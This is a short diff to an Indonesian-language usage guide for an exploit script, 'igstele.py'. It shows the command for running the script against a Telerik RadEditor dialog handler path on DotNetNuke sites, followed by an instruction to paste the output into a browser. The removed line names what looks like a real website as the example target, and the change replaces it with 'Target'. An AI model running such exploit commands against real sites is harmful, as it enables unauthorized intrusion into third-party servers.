@@ -27,7 +27,7 @@ $ python2 igstele.py -exploit http://target.com 48 hex 9
 
 atau contoh kayak di bawah ini;
 
-$ python2 igstele.py -exploit http://drboostani.com/desktopmodules/admin/radeditorprovider/dialoghandler.aspx 48 hex 9
+$ python2 igstele.py -exploit http://Target/desktopmodules/admin/radeditorprovider/dialoghandler.aspx 48 hex 9
 
 kemudian salin hasil dan paste di browser anda atau contoh hasil ada di bawah tinggal kalian copy aja
 
